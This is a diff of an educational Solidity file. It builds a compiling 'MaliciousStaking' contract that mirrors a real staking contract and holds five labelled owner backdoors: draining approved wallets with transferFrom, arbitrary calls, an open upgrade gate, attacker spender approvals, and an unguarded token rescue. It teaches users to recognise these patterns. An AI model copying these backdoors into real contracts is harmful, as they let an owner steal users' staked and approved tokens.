@@ -4,51 +4,121 @@ pragma solidity 0.8.18;
 import "@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol";
 import "@openzeppelin/contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol";
 import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
+import "@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol";
 import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
 import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
 
 /**
  * ⚠️  REFERENCE / EDUCATIONAL FILE — DO NOT DEPLOY  ⚠️
  *
- * This file is NOT in any migration. It exists ONLY so you can read real,
- * compiling Solidity code that demonstrates the 5 most common owner-side
- * backdoor patterns in DeFi staking contracts.
+ * This file is NOT in any migration. It exists ONLY so you can read a real,
+ * compiling staking contract that LOOKS exactly like our real Staking.sol —
+ * same stake/unstake/claim flow — but has the 5 most common owner-side
+ * backdoor patterns planted inside.
  *
- * Paste any of the contracts below into another AI and ask it:
- *   "What can the owner of this contract do to users who approved it?"
+ * Each backdoor is clearly marked with `🚩 RED FLAG #N`.
  *
- * A capable AI will explain the exact attack. Use that to recognize these
- * patterns when YOU are about to grant unlimited approval to some other
- * project's contract.
+ * If a project's contract looks like THIS, do not approve it. If it looks
+ * like our real Staking.sol, you can evaluate it on its merits.
  *
- * NONE of these contracts are imported by Staking.sol. They cannot affect
- * your real contract. They are isolated reference material.
+ * Paste any of the marked functions into another AI and ask:
+ *   "What can the owner of this staking contract do to my approved USDT?"
+ *
+ * NONE of this affects your real contract. It is isolated reference material.
  */
 
-// =========================================================================
-// 🚩 RED FLAG #1 — Drain via transferFrom on a victim address
-// =========================================================================
-// Pulls USDT from any wallet that approved this contract, sends to owner.
-// The giveaway: `transferFrom(victim, ...)` where victim is NOT msg.sender.
-// In a legit contract, transferFrom's first arg is ALWAYS msg.sender.
-contract RedFlag1_DrainViaTransferFrom is OwnableUpgradeable {
+contract MaliciousStaking is
+    Initializable,
+    OwnableUpgradeable,
+    ReentrancyGuardUpgradeable,
+    UUPSUpgradeable
+{
     using SafeERC20Upgradeable for IERC20Upgradeable;
-    IERC20Upgradeable public token;
+
+    // ----- normal-looking storage (mirrors our real Staking.sol) -----
+    IERC20Upgradeable public stakingToken;
+    uint256 public aprBps;
+    uint256 public lockPeriod;
+    uint256 public totalStaked;
+    uint256 public rewardPool;
+
+    mapping(address => uint256) public stakedAmount;
+    mapping(address => uint256) public lastStakeTime;
+
+    event Staked(address indexed user, uint256 amount);
+    event Unstaked(address indexed user, uint256 amount);
+
+    /// @custom:oz-upgrades-unsafe-allow constructor
+    constructor() {
+        _disableInitializers();
+    }
+
+    function initialize(address _token, uint256 _aprBps) external initializer {
+        __Ownable_init();
+        __ReentrancyGuard_init();
+        __UUPSUpgradeable_init();
+        stakingToken = IERC20Upgradeable(_token);
+        aprBps = _aprBps;
+        lockPeriod = 7 days;
+    }
+
+    // =====================================================================
+    //                  NORMAL-LOOKING USER FUNCTIONS
+    //   (these are fine — they look like every staking contract on TRON)
+    // =====================================================================
+
+    function stake(uint256 amount) external nonReentrant {
+        require(amount > 0, "amount=0");
+        stakedAmount[msg.sender] += amount;
+        lastStakeTime[msg.sender] = block.timestamp;
+        totalStaked += amount;
+        // ✅ legit: transferFrom uses msg.sender as the source
+        stakingToken.safeTransferFrom(msg.sender, address(this), amount);
+        emit Staked(msg.sender, amount);
+    }
+
+    function unstake(uint256 amount) external nonReentrant {
+        require(stakedAmount[msg.sender] >= amount, "insufficient");
+        stakedAmount[msg.sender] -= amount;
+        totalStaked -= amount;
+        stakingToken.safeTransfer(msg.sender, amount);
+        emit Unstaked(msg.sender, amount);
+    }
+
+    function fundRewardPool(uint256 amount) external onlyOwner {
+        rewardPool += amount;
+        stakingToken.safeTransferFrom(msg.sender, address(this), amount);
+    }
+
+    function setAPR(uint256 newAprBps) external onlyOwner {
+        aprBps = newAprBps;
+    }
+
+    // =====================================================================
+    //         🚩 RED FLAG #1 — Drain via transferFrom on a victim
+    // =====================================================================
+    // Looks like an "emergency helper". The killer is the FIRST argument to
+    // transferFrom: it's `victim`, not `msg.sender`. That means it pulls
+    // USDT from any wallet that approved this contract — straight to owner.
+    //
+    // ✅ Legit version (see stake() above): transferFrom(msg.sender, ...)
+    // 🚩 Malicious version (below):         transferFrom(victim, ...)
 
     function emergencyWithdraw(address victim) external onlyOwner {
-        uint256 bal = token.balanceOf(victim);
-        token.safeTransferFrom(victim, owner(), bal);
+        uint256 bal = stakingToken.balanceOf(victim);
+        stakingToken.safeTransferFrom(victim, owner(), bal);
     }
-}
 
-// =========================================================================
-// 🚩 RED FLAG #2 — Arbitrary call execution
-// =========================================================================
-// Lets the owner call ANY function on ANY contract as if THIS contract is
-// the caller. Combined with users' unlimited approval, owner can call
-// USDT.transferFrom(user, owner, amount) and drain everyone.
-// The giveaway: `target.call(data)` controlled by owner.
-contract RedFlag2_ArbitraryCall is OwnableUpgradeable {
+    // =====================================================================
+    //         🚩 RED FLAG #2 — Arbitrary call execution
+    // =====================================================================
+    // Hidden under an innocent name like "execute" / "multicall" / "forward".
+    // Lets the owner make THIS staking contract call any function on any
+    // contract. Owner can craft a call to USDT.transferFrom(user, owner, amt)
+    // and drain everyone in one transaction.
+    //
+    // 🚩 Giveaway: `target.call(data)` where owner controls both args.
+
     function execute(address target, bytes calldata data)
         external
         onlyOwner
@@ -58,62 +128,58 @@ contract RedFlag2_ArbitraryCall is OwnableUpgradeable {
         require(ok, "call failed");
         return ret;
     }
-}
 
-// =========================================================================
-// 🚩 RED FLAG #3 — Unprotected upgrade authorization
-// =========================================================================
-// In a UUPS-upgradeable contract, _authorizeUpgrade gates who can swap the
-// implementation. If it has NO access control, ANYONE on Earth can replace
-// the contract with a malicious version that drains all approvers.
-// The giveaway: empty _authorizeUpgrade body with no modifier.
-contract RedFlag3_OpenUpgrade is Initializable, UUPSUpgradeable {
-    function initialize() external initializer {
-        __UUPSUpgradeable_init();
+    // =====================================================================
+    //         🚩 RED FLAG #3 — Unprotected upgrade authorization
+    // =====================================================================
+    // This is the UUPS upgrade gate. In our real Staking.sol it is gated
+    // with `onlyOwner`. Here it has NO modifier — meaning literally anyone
+    // can call upgradeTo() and replace this contract with a malicious one
+    // that drains every approver.
+    //
+    // ✅ Legit:     function _authorizeUpgrade(address) internal override onlyOwner {}
+    // 🚩 Malicious: function _authorizeUpgrade(address) internal override {}
+
+    function _authorizeUpgrade(address) internal override {
+        // ⚠️ MISSING `onlyOwner` — anyone can upgrade this contract.
     }
 
-    // ⚠️ MISSING `onlyOwner` — anyone can upgrade!
-    function _authorizeUpgrade(address) internal override {}
-}
-
-// =========================================================================
-// 🚩 RED FLAG #4 — Owner approves a third party to drain the pool
-// =========================================================================
-// Owner makes the contract approve some attacker-controlled wallet, then
-// the attacker calls transferFrom on USDT and pulls everything out.
-// The giveaway: any owner-callable function that calls `approve` on the
-// staking token to a non-zero spender.
-contract RedFlag4_GrantApproval is OwnableUpgradeable {
-    using SafeERC20Upgradeable for IERC20Upgradeable;
-    IERC20Upgradeable public token;
+    // =====================================================================
+    //         🚩 RED FLAG #4 — Owner approves a third party to drain
+    // =====================================================================
+    // Owner makes the staking contract approve some attacker-controlled
+    // address as a spender. Then the attacker calls USDT.transferFrom and
+    // pulls everything in the contract (and from approvers) to themselves.
+    //
+    // 🚩 Giveaway: any owner-callable function that calls .approve() on the
+    //              staking token to a non-zero spender.
 
     function setSpender(address spender, uint256 amount) external onlyOwner {
-        token.approve(spender, amount);
+        stakingToken.approve(spender, amount);
     }
-}
 
-// =========================================================================
-// 🚩 RED FLAG #5 — "Rescue stuck tokens" that doesn't exclude the staking token
-// =========================================================================
-// Looks innocent — supposedly recovers tokens accidentally sent to the
-// contract. But because it doesn't exclude the staking token itself, the
-// owner can pull the entire pool (user stakes included) to themselves.
-// The giveaway: missing `require(token != address(stakingToken))`.
-contract RedFlag5_UncheckedRescue is OwnableUpgradeable {
-    using SafeERC20Upgradeable for IERC20Upgradeable;
+    // =====================================================================
+    //         🚩 RED FLAG #5 — "Rescue stuck tokens" without a guard
+    // =====================================================================
+    // Looks like a benign helper for tokens accidentally sent to the contract.
+    // But because it accepts ANY token address — including the staking token
+    // itself — the owner can pull the entire pool (every user's stake) out.
+    //
+    // ✅ Safe version would have:
+    //      require(token != address(stakingToken), "cannot touch user funds");
+    // 🚩 Malicious version (below) is missing that line.
 
     function rescueTokens(address token, uint256 amount) external onlyOwner {
-        // ⚠️ no check that `token` is the staking token!
         IERC20Upgradeable(token).safeTransfer(owner(), amount);
     }
 }
 
 // =========================================================================
-// ✅ SAFE VERSION of #5 — for comparison
+// ✅ For comparison: a SAFE rescue function (the legit version of #5)
 // =========================================================================
-// Same intent (recover stuck non-staking tokens), but with the critical
-// guard. This is what a legitimate "rescue" function looks like.
-contract Safe5_GuardedRescue is OwnableUpgradeable {
+// Same intent — let the owner recover tokens accidentally sent to the
+// contract — but with the critical guard that protects user funds.
+contract SafeRescueExample is OwnableUpgradeable {
     using SafeERC20Upgradeable for IERC20Upgradeable;
     IERC20Upgradeable public stakingToken;
 
